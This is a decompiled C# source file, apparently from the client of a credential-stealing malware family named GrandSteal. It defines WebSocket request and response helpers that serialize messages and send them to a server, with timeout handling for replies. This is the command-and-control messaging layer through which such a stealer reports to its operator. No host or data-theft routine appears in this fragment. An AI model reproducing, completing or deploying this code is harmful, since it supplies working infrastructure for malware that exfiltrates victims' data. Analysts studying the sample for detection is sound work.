using System;
using System.Threading;
using GrandSteal.Client.Models;
using GrandSteal.Client.Models.Extensions;
using GrandSteal.SharedModels.Communication;
using WebSocket4Net;

namespace GrandSteal.Client.Data.Server
{
	// Token: 0x02000009 RID: 9
	public static class RequestsExtensions
	{
		// Token: 0x06000038 RID: 56 RVA: 0x00003CD8 File Offset: 0x00001ED8
		public static bool? HandleResponse(this ResponseBase response)
		{
			ResponseHandler onResponseRecieved = RequestsExtensions.OnResponseRecieved;
			if (onResponseRecieved == null)
			{
				return null;
			}
			return new bool?(onResponseRecieved(response));
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000021F6 File Offset: 0x000003F6
		public static AsyncAction SendResponse<TInput>(this RequestBase request, WebSocket session, TInput objectToSend)
		{
			return AsyncTask.StartNew(delegate()
			{
				byte[] array = request.CreateResponse<TInput>(objectToSend).SerializeProto<Response<TInput>>();
				session.Send(array, 0, array.Length);
			});
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00002222 File Offset: 0x00000422
		public static AsyncAction SendRequest<TInput>(this WebSocket session, TInput objectToSend, string Name)
		{
			return AsyncTask.StartNew(delegate()
			{
				byte[] array = new Request<TInput>(objectToSend, Name).SerializeProto<Request<TInput>>();
				session.Send(array, 0, array.Length);
			});
		}

		// Token: 0x0600003B RID: 59 RVA: 0x0000224E File Offset: 0x0000044E
		public static AsyncAction<TResult> SendRequest<TInput, TResult>(this WebSocket session, TInput objectToSend, string Name, int timeoutMilliseconds = 60000)
		{
			return AsyncTask.StartNew<TResult>(delegate()
			{
				TResult result;
				try
				{
					RequestsExtensions.<>c__DisplayClass4_1<TInput, TResult> CS$<>8__locals2 = new RequestsExtensions.<>c__DisplayClass4_1<TInput, TResult>();
					DateTime t = DateTime.Now.AddMilliseconds((double)timeoutMilliseconds);
					CS$<>8__locals2.localRequest = new Request<TInput>(objectToSend, Name);
					CS$<>8__locals2.handled = false;
					CS$<>8__locals2.result = default(TResult);
					RequestsExtensions.OnResponseRecieved = (ResponseHandler)Delegate.Combine(RequestsExtensions.OnResponseRecieved, new ResponseHandler(CS$<>8__locals2.<SendRequest>g__OnResponse|1));
					byte[] array = CS$<>8__locals2.localRequest.SerializeProto<Request<TInput>>();
					session.Send(array, 0, array.Length);
					while (t >= DateTime.Now && !CS$<>8__locals2.handled)
					{
						Thread.Sleep(100);
					}
					RequestsExtensions.OnResponseRecieved = (ResponseHandler)Delegate.Remove(RequestsExtensions.OnResponseRecieved, new ResponseHandler(CS$<>8__locals2.<SendRequest>g__OnResponse|1));
					result = CS$<>8__locals2.result;
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
					result = default(TResult);
				}
				return result;
			});
		}

		// Token: 0x04000013 RID: 19
		public static ResponseHandler OnResponseRecieved;
	}
}
